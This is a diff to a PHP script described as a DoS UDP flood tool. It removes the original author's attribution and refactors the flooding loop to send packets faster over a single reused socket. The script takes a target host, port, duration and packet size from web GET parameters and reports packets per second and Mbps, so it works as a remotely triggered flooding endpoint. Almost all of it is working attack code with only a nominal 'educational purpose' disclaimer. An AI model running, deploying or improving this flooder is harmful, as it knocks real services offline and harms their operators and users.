@@ -4,8 +4,7 @@
  *
  * Script to perform a DoS UDP Flood
  *
- * @link https://github.com/brielmayer/dos-php-script The DDoS UDP flood GitHub project
- * @author Patrick (c0re^) Brielmayer
+ * @author c0re^
  * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
  *
  * This tool is written on educational purpose, please use it on your own good faith.
@@ -39,7 +38,7 @@ class DoS {
 
     /**
      * Target port, e.g. 443
-     * @var
+     * @var int
      */
     private $port;
 
@@ -64,10 +63,10 @@ class DoS {
      */
     public function __construct($host, $port, $time, $size)
     {
-        if(!filter_var($host, FILTER_VALIDATE_IP)) throw new InvalidArgumentException("host missing or incorrect format");
-        if(!filter_var($port, FILTER_VALIDATE_INT)) throw new InvalidArgumentException("port incorrect format");
-        if(!filter_var($time, FILTER_VALIDATE_INT)) throw new InvalidArgumentException("time missing or incorrect format");
-        if(!filter_var($size, FILTER_VALIDATE_INT)) throw new InvalidArgumentException("size incorrect format");
+        Preconditions::checkArgument(!filter_var($host, FILTER_VALIDATE_IP), "host missing or incorrect format");
+        Preconditions::checkArgument(!filter_var($port, FILTER_VALIDATE_INT), "port incorrect format");
+        Preconditions::checkArgument(!filter_var($time, FILTER_VALIDATE_INT), "time missing or incorrect format");
+        Preconditions::checkArgument(!filter_var($size, FILTER_VALIDATE_INT), "size incorrect format");
 
         $this->host = $host;
         $this->port = $port;
@@ -78,35 +77,78 @@ class DoS {
     /**
      * Starts UPD attack
      * @return int Amount of bytes sent
+     * @throws Exception
      */
     public function flood() {
-        $packet = str_repeat("0", $this->size);
-        $start_time = time();
-        $end_time = $start_time + $this->time;
-        for($packets = 1; time() <= $end_time; ++$packets)
-        {
-            $f_sock = fsockopen("udp://$this->host", $this->port, $errno, $errmsg, 30);
-            fwrite($f_sock, $packet);
-            fclose($f_sock);
+        /** @var string $packet */
+        //$packet = openssl_random_pseudo_bytes($this->size);
+        $packet = str_repeat("\x00", $this->size);
+
+        /** @var int $startTime */
+        $startTime = time();
+
+        /** @var int $endTime */
+        $endTime = $startTime + $this->time;
+
+        /** @var resource $socket */
+        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
+        if(!$socket) {
+            throw new Exception($errorMessage);
         }
-        return $packets * $this->size;
+
+        for($packets = 1; time() <= $endTime; ++$packets)
+        {
+            @fwrite($socket, $packet);
+        }
+        @fclose($socket);
+
+        return $packets;
     }
 }
 
-/** Main Application */
-$host = $_GET['host']; // required
-$port = isset($_GET['port']) ? $_GET['port'] : 80; // optional, default 80
-$time = $_GET['time']; // required
-$size = isset($_GET['size']) ? $_GET['size'] : 65000; // optional, default 65000
+class Preconditions {
 
-$result = null;
-try {
-    $dos = new DoS($host, $port, $time, $size);
-    $bytes = $dos->flood();
-    $result = array("success" => "true", "bytes_sent" => $bytes);
-} catch (InvalidArgumentException $e) {
-    $result = array("success" => "false", "error" => $e->getMessage());
-} finally {
-    echo json_encode($result);
+    /**
+     * Ensures the truth of an expression involving one or more parameters to the calling method.
+     * @param $expression boolean A boolean expression
+     * @param $errorMessage string The exception message to use if the check fails
+     * @throws InvalidArgumentException If expression is false
+     */
+    public static function checkArgument($expression, $errorMessage) {
+        if($expression) {
+            throw new InvalidArgumentException($errorMessage);
+        }
+    }
 }
 
+class Application {
+
+    public static function start($args) {
+
+        if(sizeof($args) === 0) {
+            echo json_encode(array("status" => "ok"));
+            return;
+        }
+
+        $host = $args['host'];
+        $port = isset($args['port']) ? $args['port'] : 80;
+        $time = $args['time'];
+        $size = isset($args['size']) ? $args['size'] : (1024 * 64); // 64 kB
+
+        $result = null;
+        try {
+            $dos = new DoS($host, $port, $time, $size);
+            $packets = $dos->flood();
+
+            $pps = intval($packets / $time);
+            $mbps = intval($packets * $size / 1024 / 1024 / $time);
+            $result = array("success" => "true", "pps" => $pps, "mbps" => $mbps);
+        } catch (Exception $e) {
+            $result = array("success" => "false", "error" => $e->getMessage());
+        }
+
+        echo json_encode($result);
+    }
+}
+
+Application::start($_GET);
